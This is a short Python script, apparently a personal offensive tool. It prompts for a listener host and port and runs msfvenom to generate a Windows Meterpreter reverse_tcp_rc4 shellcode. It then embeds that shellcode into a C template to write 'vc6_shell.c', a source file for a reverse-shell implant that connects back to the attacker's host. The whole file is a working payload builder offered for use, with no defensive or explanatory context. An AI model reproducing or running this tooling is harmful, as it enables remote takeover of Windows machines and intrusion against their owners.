#!/bin/python3
# Author:Jerry<calljerryli@outlook.com>

import os

cmd_tmp = 'msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=%s LPORT=%s -f c > shellcode'
lhost = input('LHOST\n>>> ')
lport = input('LPORT(default:4444)\n>>> ')
if lport == '':
    lport = 4444
cmd = cmd_tmp % (lhost, lport)
print(cmd)
os.system(cmd)

with open('./shellcode', 'r') as f:
    shellcode = f.read()

with open('./vc6_tmp.c', 'r') as f:
    vc6_tmp = f.read()

vc6code = vc6_tmp.replace('[% shell_code %]', shellcode)

with open('./vc6_shell.c', 'w') as f:
    f.write(vc6code)

print('C Code Generation complete -> ./vc6_shell.c')
